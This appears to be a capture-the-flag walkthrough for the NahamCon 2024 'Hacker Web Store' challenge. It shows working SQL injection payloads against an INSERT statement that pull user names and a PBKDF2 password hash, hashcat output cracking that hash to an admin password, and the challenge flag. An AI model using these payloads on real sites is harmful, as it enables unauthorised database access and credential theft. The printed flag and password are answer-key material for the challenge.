This is a walkthrough for the NahamCon CTF 2024 called **Hacker Web Store**

# Description
Author: @Jstith

Welcome to the hacker web store! Feel free to look around at our wonderful products, or create your own to sell.

This challenge may require a local password list, which we have provided below. Reminder, bruteforcing logins is not necessary and against the rules.

# The site
There is a page with product cards, a page to create products, and an admin page that requires a login. 
There is no visible code in the developer console. 
Ending strings and adding comment tags to the username and password on the admin page doesn't seem to have any affect on the page. 

# Create Page
There is a form for the product name, price, and description. Adding a `'` to the name field produces this error on the product page:
```
Error in Statement: INSERT INTO Products (name, price, desc) VALUES ('name'', '1', 'desc');

near "1": syntax error
```

That indicates we can do SQLi. 

Description: desc');--
Return: Success! Added new product to database.

Name: name','1',(select * from users));--
Return: 
```
Error in Statement: INSERT INTO Products (name, price, desc) VALUES ('name','1',(select * from users));--', '', '');

sub-select returns 3 columns - expected 1
```

Name: name','1',(select name from users order by name asc));--
Return: James

Name: name','1',(select name from users order by name desc));--
Return: website_admin_account

Name: name','1',(select password from users where name='website_admin_user'));--
Return: pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57

# Cracking the Hash
Hash was likely generated using python's `werkzeug.security.generate_password_hash("<password>", "pbkdf2")` because that function seems to be 
one of the only places that hashes are generated with that format. I was having a really hard time getting hashcat or jtr to accept the hash,
even when I changed the formatting. Fortunatly, the library also has `check_password_hash("<hash>", "<password>")` which lets you check if the hash came from that password,
essentially allowing a dictionary attack. Slower than the other tools, though. 

But that didn't work... so then I had to go back to trying hashcat. I looked through the source code for werkzeug and saw how it output the hash.
I had to base64 encode the salt and hash, the salt was simple but I had to convert the hash into hex and then b64 encode it. 

```
 $ hashcat -m10900 tmp2 password_list.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 2827/5718 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: password_list.txt
* Passwords.: 2000
* Bytes.....: 19382
* Keyspace..: 2000

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

sha256:600000:TVNvazM0ekJ1Zm85ZDF0Yw==:sq36+u7UWfkDQB7BZW+do29LTAilBCfseEFXBRO/jlc=:ntadmin1234

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:600000:TVNvazM0ekJ1Zm85ZDF0Yw==:sq36+u7UWfkD...O/jlc=
Time.Started.....: Fri May 24 00:48:40 2024 (19 secs)
Time.Estimated...: Fri May 24 00:48:59 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (password_list.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      103 H/s (2.01ms) @ Accel:512 Loops:64 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2000/2000 (100.00%)
Rejected.........: 0/2000 (0.00%)
Restore.Point....: 0/2000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:599936-599999
Candidate.Engine.: Device Generator
Candidates.#1....: !!!\\\\ -> coolguy

Started: Fri May 24 00:48:38 2024
Stopped: Fri May 24 00:49:01 2024

┌──(sawyeras㉿DESKTOP-D9IQNRC)-[/mnt/c/Users/ashto/Desktop]
└─$ hashcat -m10900 --show tmp2
sha256:600000:TVNvazM0ekJ1Zm85ZDF0Yw==:sq36+u7UWfkDQB7BZW+do29LTAilBCfseEFXBRO/jlc=:ntadmin1234
```

# Getting the flag
Log in using `username: website_admin_account password: ntadmin1234` and you get a page with the flag on it. 
`flag{87257f24fd71ea9ed8aa62837e768ec0}`
